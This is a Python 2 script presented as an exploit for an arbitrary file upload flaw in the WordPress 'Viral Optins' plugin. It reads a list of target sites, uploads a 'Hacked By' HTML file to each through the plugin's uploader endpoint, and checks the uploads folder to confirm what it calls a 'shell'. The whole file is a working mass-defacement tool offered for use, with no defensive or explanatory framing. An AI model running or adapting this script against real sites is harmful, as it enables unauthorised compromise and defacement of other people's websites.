#!/usr/bin/python
#-*-coding:utf-8-*-
# Exploit Tittle : Wordpress Exploit Viral Optins Arbitrary File Upload.
# Coded By : Deray
import os,sys
try:
	import requests
except:
	print "[*] Requests Modules Is Not Installed!"
	print "[-] Install dlu anjing."
	sys.exit()
RED = '\033[31m' 
WHITEBOLD = '\033[1;37m' 
print WHITEBOLD
print "="*53
print "Wordpress Exploit Viral-Optins Arbitrary File Upload."
print "\t     Made With %s<3 %sBy LOoLzeC"%(RED,WHITEBOLD)
print "\t         Coded By Deray"
print "="*53
hacked=raw_input("\n[?] hacked by? ")
filename=raw_input("[*] Target List> ")
nm="pwned.txt"
fileo=open(filename,'r').readlines()
k=len(fileo)
print "[*] Target Loaded :",k
print "[*] Exploiting.."
postt="Hacked By %s"%(hacked)
count=0
fol=open(filename,'r')
while (k>count):
	list=fol.readline().replace('\n', '')
	files={'Filedata':(nm,postt,'text/html')}
	r=requests.post(''+list+'/wp-content/plugins/viral-optins/api/uploader/file-uploader.php',verify = False,files=files)
	print "\n[*] Checking %s"%(list)
	deray_get_shell=""+list+"/wp-content/uploads/2018/08/%s"%(nm)
	rr=requests.get(deray_get_shell)
	if "Hacked" in rr.text:
		print "[*] Shell Pwned!"
		print "[*] Path =>"+RED+"",deray_get_shell
		print WHITEBOLD
	else:
		print "[-] Exploit Failed."
	count=count+1
